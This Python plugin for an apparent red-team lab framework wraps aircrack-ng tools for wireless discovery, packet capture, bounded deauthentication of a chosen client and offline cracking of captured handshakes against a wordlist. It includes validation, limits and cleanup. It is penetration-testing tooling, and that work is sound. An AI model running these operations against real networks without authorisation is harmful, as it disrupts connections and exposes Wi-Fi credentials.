"""Etapas wireless independentes; não encadeia ações implicitamente."""
import re
import uuid
from pathlib import Path
from plugins.base import BasePlugin
from core.attack import mapping
from core.operations import Process, Unavailable, command
from core.validation import positive
from plugins.lab.network_lab import interface, require_root, wait_processes


def mac(value):
    if not re.fullmatch(r"(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", value):
        raise ValueError("MAC inválido")
    return value.lower()


class WirelessLab(BasePlugin):
    PLUGIN_ID = "wireless_lab"
    ALIASES = ("ops:301",)
    NAME = "Wireless de laboratório"
    DESCRIPTION = "Descoberta/captura, deauth delimitado ou análise offline, em operações separadas."
    GROUP = "Red"
    TACTIC = "TA0006"
    ATTACK = (mapping("T1040"), mapping("T1110.002"))
    OPERATION_DEPENDENCIES = {
        "discover": (("executable", "iw"), ("executable", "ip"), ("executable", "airodump-ng")),
        "capture": (("executable", "iw"), ("executable", "ip"), ("executable", "airodump-ng")),
        "deauth": (("executable", "iw"), ("executable", "ip"), ("executable", "aireplay-ng")),
        "crack": (("executable", "aircrack-ng"),),
    }

    def add_arguments(self, parser):
        parser.add_argument("--operation", choices=("discover", "capture", "deauth", "crack"), required=True)
        parser.add_argument("--interface")
        parser.add_argument("--bssid")
        parser.add_argument("--client")
        parser.add_argument("--channel", type=positive)
        parser.add_argument("--duration", type=positive, default=30)
        parser.add_argument("--count", type=positive, default=5)
        parser.add_argument("--capture", type=Path)
        parser.add_argument("--wordlist", type=Path)
        parser.add_argument("--timeout", type=positive, default=300)

    def execute(self, p, ctx):
        operation = p["operation"]
        ctx.result.attack = [mapping("T1110.002")] if operation == "crack" else ([mapping("T1040")] if operation in ("discover", "capture") else [])
        if operation == "crack":
            if not p.get("capture") or not p.get("wordlist") or not p["capture"].is_file() or not p["wordlist"].is_file():
                raise ValueError("Informe --capture e --wordlist existentes")
            raw, _, code = command(["aircrack-ng", str(p["capture"].resolve()), "-w", str(p["wordlist"].resolve())], p["timeout"], check=False)
            ctx.artifact("offline-analysis.txt", raw)
            ctx.finding(operation=operation, returncode=code)
            if code:
                ctx.error(f"aircrack-ng retornou {code}")
            return
        require_root()
        if not p.get("interface"):
            raise ValueError("--interface obrigatório")
        iface = interface(p["interface"])
        if p["duration"] > 3600 or p["count"] > 100:
            raise ValueError("Duração máxima 3600s; count máximo 100")
        if operation in ("capture", "deauth") and (not p.get("bssid") or not p.get("channel")):
            raise ValueError("--bssid e --channel obrigatórios")
        if p.get("bssid"):
            p["bssid"] = mac(p["bssid"])
        if p.get("client"):
            p["client"] = mac(p["client"])
        info, _, _ = command(["iw", "dev", iface, "info"])
        match = re.search(r"channel (\d+)", info)
        original_channel = match.group(1) if match else None
        if not original_channel:
            raise Unavailable("Não foi possível identificar canal original para restauração")
        process = None
        monitor = None
        prefix = ctx.artifact("wireless")
        try:
            if "type monitor" not in info:
                monitor = "owl" + uuid.uuid4().hex[:8]
                command(["iw", "dev", iface, "interface", "add", monitor, "type", "monitor"])
                command(["ip", "link", "set", monitor, "up"])
            active = monitor or iface
            if p.get("channel"):
                command(["iw", "dev", active, "set", "channel", str(p["channel"])])
            if operation == "deauth":
                if not p.get("client"):
                    raise ValueError("--client obrigatório para deauth")
                raw, _, _ = command(["aireplay-ng", "--deauth", str(p["count"]), "-a", p["bssid"], "-c", p["client"], active], p["timeout"])
                ctx.artifact("deauth.txt", raw)
            else:
                argv = ["airodump-ng", "--write", str(prefix), "--output-format", "pcap,csv"]
                if operation == "capture":
                    argv += ["--bssid", p["bssid"], "--channel", str(p["channel"])]
                process = Process(argv + [active])
                wait_processes([process], p["duration"])
            ctx.finding(operation=operation, interface=iface)
        finally:
            if process:
                try:
                    process.stop()
                    process.collect(check=False)
                except Exception as exc:
                    ctx.error(f"Falha ao encerrar captura: {exc}")
            if monitor:
                try:
                    command(["iw", "dev", monitor, "del"])
                except Exception as exc:
                    ctx.error(f"Falha ao remover interface {monitor}: {exc}")
            if original_channel:
                try:
                    command(["iw", "dev", iface, "set", "channel", original_channel])
                    ctx.finding(restored_channel=original_channel)
                except Exception as exc:
                    ctx.error(f"Falha ao restaurar canal: {exc}")
            for path in ctx.directory.glob("wireless-*"):
                path.chmod(0o600)
                ctx.artifact(path.name)
